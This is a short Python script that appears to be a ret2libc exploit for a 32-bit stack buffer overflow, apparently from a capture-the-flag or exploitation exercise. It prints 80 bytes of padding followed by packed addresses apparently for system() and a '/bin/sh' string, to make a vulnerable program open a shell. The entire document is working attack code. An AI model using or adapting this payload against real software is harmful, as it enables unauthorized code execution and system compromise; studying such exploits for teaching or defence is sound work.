import struct

padding = "a" * 80
system = struct.pack("I", 0xb7ecffb0)
ret = "bbbb"
bin_sh = struct.pack("I", 0xb7fb63bf)

print(padding + system + ret + bin_sh)
